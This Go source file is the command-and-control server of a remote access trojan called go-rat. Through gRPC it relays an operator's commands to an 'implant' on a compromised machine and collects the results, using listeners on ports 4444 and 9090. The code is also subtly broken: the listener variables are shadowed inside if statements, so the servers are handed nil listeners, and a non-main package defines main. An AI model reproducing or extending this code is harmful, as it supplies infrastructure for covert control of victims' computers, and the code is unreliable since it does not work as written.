package server

import (
	"context"
	"errors"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"log"
	"net"
)

type implantServer struct {
	work, output chan *grpcapi.Command
	grpcapi.ImplantServer
}

type adminServer struct {
	work, output chan *grpcapi.Command
	grpcapi.AdminServer
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	cmd := new(grpcapi.Command)

	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- command
	}()
	res = <-s.output
	return res, nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	if implantListener, err := net.Listen("tcp", "localhost:4444"); err != nil {
		log.Print(implantListener)
		log.Print("Error en el listener del implant")
		log.Fatal(err)
	}
	if adminListener, err := net.Listen("tcp", "localhost:9090"); err != nil {
		log.Print(adminListener)
		log.Print("Error en el listener del admin")
		log.Fatal(err)
	}

	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	go func() {
		err = grpcImplantServer.Serve(implantListener)
		if err != nil {
			log.Fatal(err)
		}
	}()
	err = grpcAdminServer.Serve(adminListener)
	if err != nil {
		log.Fatal(err)
	}

}
